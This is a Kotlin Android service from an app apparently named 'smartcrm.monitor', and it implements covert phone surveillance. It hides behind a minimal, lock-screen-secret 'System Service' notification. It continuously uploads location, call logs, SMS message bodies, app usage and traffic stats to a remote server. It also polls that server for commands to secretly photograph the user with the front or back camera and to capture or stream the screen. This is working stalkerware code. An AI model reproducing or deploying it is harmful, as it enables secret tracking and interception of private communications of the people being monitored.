package com.smartcrm.monitor

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.ImageReader
import android.net.TrafficStats
import android.os.*
import android.provider.CallLog
import android.provider.Telephony
import android.app.usage.UsageStatsManager
import android.util.Base64
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

class MonitorService : Service() {

    private val executor      = Executors.newCachedThreadPool()
    private val handler       = Handler(Looper.getMainLooper())
    private var lastRx        = 0L
    private var lastTx        = 0L
    private var lastCallTime  = 0L
    private var lastSmsTime   = 0L
    private var locationManager: LocationManager? = null
    private var lastLocation: Location? = null
    private val cameraInUse   = AtomicBoolean(false)

    // ============================================
    // LIFECYCLE
    // ============================================
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotifChannel()
        startForeground(Config.NOTIF_ID, buildNotif())

        lastRx        = TrafficStats.getTotalRxBytes()
        lastTx        = TrafficStats.getTotalTxBytes()
        lastCallTime  = System.currentTimeMillis() - 86400000L
        lastSmsTime   = System.currentTimeMillis() - 86400000L

        executor.execute { sendStatus("online") }

        initLocationListener()
        startActivityLoop()
        startLocationLoop()
        startCallLogLoop()
        startSmsLoop()
        startNetworkLoop()
        startCommandPoll()

        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    override fun onDestroy() {
        super.onDestroy()
        executor.execute { sendStatus("offline") }
        handler.removeCallbacksAndMessages(null)
        try { locationManager?.removeUpdates(locationListener) } catch (e: Exception) {}
        executor.shutdown()
    }

    // ============================================
    // NOTIFICATION
    // ============================================
    private fun createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                Config.NOTIF_CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification {
        return NotificationCompat.Builder(this, Config.NOTIF_CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    // ============================================
    // HELPERS
    // ============================================
    private fun now(): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

    private fun sendStatus(status: String) {
        try {
            val d = JSONObject()
            d.put("type", "pc_status")
            d.put("status", status)
            d.put("timestamp", now())
            ApiClient.post("api.php", d, this)
        } catch (e: Exception) {}
    }

    private fun hasPermission(perm: String): Boolean =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    // ============================================
    // LOCATION — active listener + fallback poll
    // ============================================
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(loc: Location) {
            lastLocation = loc
        }
        @Deprecated("Deprecated in Java")
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    private fun initLocationListener() {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
            !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) return
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

            // Try GPS first
            if (locationManager!!.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager!!.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    30_000L, // 30 seconds
                    10f,     // 10 meters
                    locationListener,
                    Looper.getMainLooper()
                )
                lastLocation = locationManager!!.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            }

            // Also listen on network provider
            if (locationManager!!.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager!!.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    30_000L,
                    10f,
                    locationListener,
                    Looper.getMainLooper()
                )
                if (lastLocation == null) {
                    lastLocation = locationManager!!.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                }
            }
        } catch (e: Exception) {}
    }

    private fun startLocationLoop() {
        val r = object : Runnable {
            override fun run() {
                executor.execute { sendCachedLocation() }
                handler.postDelayed(this, Config.LOCATION_INTERVAL)
            }
        }
        handler.postDelayed(r, Config.LOCATION_INTERVAL)
    }

    private fun sendCachedLocation() {
        val loc = lastLocation ?: return
        try {
            val d = JSONObject()
            d.put("type", "location")
            d.put("latitude", loc.latitude)
            d.put("longitude", loc.longitude)
            d.put("accuracy", loc.accuracy)
            d.put("speed", loc.speed)
            d.put("timestamp", now())
            ApiClient.post("api.php", d, this)
        } catch (e: Exception) {}
    }

    // ============================================
    // ACTIVITY LOOP — app usage
    // ============================================
    private fun startActivityLoop() {
        val r = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                        val end   = System.currentTimeMillis()
                        val start = end - Config.ACTIVITY_INTERVAL
                        val stats = usm?.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)

                        var topApp = ""; var topTime = 0L
                        val appList = mutableListOf<Pair<String, Long>>()

                        stats?.forEach { s ->
                            if (s.totalTimeInForeground > 0) {
                                appList.add(Pair(s.packageName, s.totalTimeInForeground))
                                if (s.totalTimeInForeground > topTime) {
                                    topTime = s.totalTimeInForeground
                                    topApp  = s.packageName
                                }
                            }
                        }

                        if (topApp.isNotEmpty()) {
                            checkAlerts(topApp)
                            val d = JSONObject()
                            d.put("type", "activity")
                            d.put("status", "active")
                            d.put("active_app", topApp)
                            d.put("active_window", topApp)
                            d.put("active_url", "")
                            d.put("timestamp", now())
                            ApiClient.post("api.php", d, this@MonitorService)
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.ACTIVITY_INTERVAL)
            }
        }
        handler.post(r)
    }

    // ============================================
    // CALL LOG
    // ============================================
    private fun startCallLogLoop() {
        val r = object : Runnable {
            override fun run() {
                executor.execute { fetchCallLogs() }
                handler.postDelayed(this, Config.CALL_LOG_INTERVAL)
            }
        }
        handler.postDelayed(r, 10_000L) // first run after 10s
    }

    private fun fetchCallLogs() {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                    CallLog.Calls.CACHED_NAME
                ),
                "${CallLog.Calls.DATE} > ?",
                arrayOf(lastCallTime.toString()),
                "${CallLog.Calls.DATE} DESC"
            )
            var maxDate = lastCallTime
            cursor?.use {
                while (it.moveToNext()) {
                    val number   = it.getString(0) ?: ""
                    val type     = it.getInt(1)
                    val duration = it.getLong(2)
                    val date     = it.getLong(3)
                    val name     = it.getString(4) ?: ""
                    if (date > maxDate) maxDate = date

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE  -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE  -> "outgoing"
                        CallLog.Calls.MISSED_TYPE    -> "missed"
                        else -> "unknown"
                    }

                    val d = JSONObject()
                    d.put("type", "call_log")
                    d.put("number", number)
                    d.put("name", name)
                    d.put("call_type", callType)
                    d.put("duration", duration)
                    d.put("call_date", date)
                    ApiClient.post("api.php", d, this)
                }
            }
            if (maxDate > lastCallTime) lastCallTime = maxDate
        } catch (e: Exception) {}
    }

    // ============================================
    // SMS
    // ============================================
    private fun startSmsLoop() {
        val r = object : Runnable {
            override fun run() {
                executor.execute { fetchSms() }
                handler.postDelayed(this, Config.SMS_INTERVAL)
            }
        }
        handler.postDelayed(r, 15_000L) // first run after 15s
    }

    private fun fetchSms() {
        if (!hasPermission(Manifest.permission.READ_SMS)) return
        try {
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE
                ),
                "${Telephony.Sms.DATE} > ?",
                arrayOf(lastSmsTime.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 50"
            )
            var maxDate = lastSmsTime
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(0) ?: ""
                    val body    = it.getString(1) ?: ""
                    val type    = it.getInt(2)
                    val date    = it.getLong(3)
                    if (date > maxDate) maxDate = date

                    val d = JSONObject()
                    d.put("type", "sms_log")
                    d.put("address", address)
                    d.put("body", body.take(500))
                    d.put("sms_type", if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "received" else "sent")
                    d.put("sms_date", date)
                    ApiClient.post("api.php", d, this)
                }
            }
            if (maxDate > lastSmsTime) lastSmsTime = maxDate
        } catch (e: Exception) {}
    }

    // ============================================
    // NETWORK
    // ============================================
    private fun startNetworkLoop() {
        val r = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val rx = TrafficStats.getTotalRxBytes()
                        val tx = TrafficStats.getTotalTxBytes()
                        val recvMb = (rx - lastRx) / 1024.0 / 1024.0
                        val sentMb = (tx - lastTx) / 1024.0 / 1024.0
                        lastRx = rx; lastTx = tx
                        val d = JSONObject()
                        d.put("type", "network")
                        d.put("recv_mb", "%.2f".format(recvMb).toDouble())
                        d.put("sent_mb", "%.2f".format(sentMb).toDouble())
                        d.put("total_mb", "%.2f".format(recvMb + sentMb).toDouble())
                        ApiClient.post("api.php", d, this@MonitorService)
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.NETWORK_INTERVAL)
            }
        }
        handler.post(r)
    }

    // ============================================
    // ALERTS
    // ============================================
    private val ALERT_PKGS = listOf(
        "com.whatsapp",
        "com.facebook.katana",
        "com.google.android.youtube",
        "com.instagram.android",
        "com.twitter.android",
        "com.netflix.mediaclient",
        "org.telegram.messenger",
        "com.zhiliaoapp.musically",
        "com.snapchat.android",
        "com.tiktok"
    )
    private var lastAlertPkg = ""

    private fun checkAlerts(pkg: String) {
        if (pkg.isEmpty()) return
        for (a in ALERT_PKGS) {
            if (pkg == a || pkg.contains(a) || a.contains(pkg)) {
                if (lastAlertPkg != pkg) {
                    lastAlertPkg = pkg
                    try {
                        val d = JSONObject()
                        d.put("type", "alert")
                        d.put("alert_type", "app_opened")
                        d.put("description", "Android: $pkg opened")
                        ApiClient.post("api.php", d, this)
                    } catch (e: Exception) {}
                }
                return
            }
        }
        lastAlertPkg = ""
    }

    // ============================================
    // COMMAND POLL — camera / webcam / screen
    // ============================================
    private fun startCommandPoll() {
        val r = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val resp  = ApiClient.get(
                            "screenshot_cmd.php",
                            mapOf("action" to "poll"),
                            this@MonitorService
                        )
                        val cmd   = resp?.optString("command") ?: ""
                        val cmdId = resp?.optInt("command_id") ?: 0
                        when (cmd) {
                            "screenshot"    -> takeCameraPhoto(cmdId, useFront = false)
                            "webcam"        -> takeCameraPhoto(cmdId, useFront = true)
                            "screen"        -> requestScreenSnapshot(cmdId)
                            "stream_start"  -> requestScreenStream(cmdId)
                            "stream_stop"   -> stopScreenStream()
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.POLL_INTERVAL)
            }
        }
        handler.post(r)
    }

    private fun requestScreenSnapshot(cmdId: Int) {
        try {
            val prefs    = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
            val approved = prefs.getBoolean("projection_approved", false)
            val i        = Intent(this, ScreenPermissionActivity::class.java)
            i.putExtra("cmd_id", cmdId)
            i.putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (approved) {
                // Already approved — start service directly via activity (needed for MediaProjection token)
                startActivity(i)
            } else {
                startActivity(i)
            }
        } catch (e: Exception) {}
    }

    private fun requestScreenStream(cmdId: Int) {
        try {
            val i = Intent(this, ScreenPermissionActivity::class.java)
            i.putExtra("cmd_id", cmdId)
            i.putExtra("mode", ScreenStreamService.MODE_STREAM)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
        } catch (e: Exception) {}
    }

    private fun stopScreenStream() {
        try {
            stopService(Intent(this, ScreenStreamService::class.java))
        } catch (e: Exception) {}
    }

    // ============================================
    // CAMERA — background capture via Camera2
    // ============================================
    private fun takeCameraPhoto(cmdId: Int, useFront: Boolean) {
        if (!hasPermission(Manifest.permission.CAMERA)) return
        if (cameraInUse.getAndSet(true)) return // prevent concurrent opens

        try {
            val manager  = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                val facing = manager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING)
                if (useFront) facing == CameraCharacteristics.LENS_FACING_FRONT
                else facing == CameraCharacteristics.LENS_FACING_BACK
            } ?: manager.cameraIdList.firstOrNull() ?: run {
                cameraInUse.set(false); return
            }

            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buffer = image.planes[0].buffer
                    val bytes  = ByteArray(buffer.remaining()).also { buffer.get(it) }
                    val b64    = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    val d = JSONObject()
                    d.put("command_id", cmdId)
                    d.put("image", b64)
                    d.put("image_type", if (useFront) "webcam" else "screenshot")
                    executor.execute {
                        ApiClient.postRaw("screenshot_cmd.php", "action=upload", d, this)
                    }
                } catch (e: Exception) {
                } finally {
                    image.close()
                    try { imageReader.close() } catch (ex: Exception) {}
                    cameraInUse.set(false)
                }
            }, handler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val surfaces = listOf(imageReader.surface)
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(imageReader.surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        }
                        camera.createCaptureSession(
                            surfaces,
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(
                                                s: CameraCaptureSession,
                                                r: CaptureRequest,
                                                result: TotalCaptureResult
                                            ) {
                                                handler.postDelayed({ camera.close() }, 1500)
                                            }
                                        }, handler)
                                    } catch (e: Exception) {
                                        camera.close()
                                        cameraInUse.set(false)
                                    }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    camera.close()
                                    cameraInUse.set(false)
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        camera.close()
                        cameraInUse.set(false)
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close(); cameraInUse.set(false)
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close(); cameraInUse.set(false)
                }
            }, handler)

        } catch (e: Exception) {
            cameraInUse.set(false)
        }
    }
}
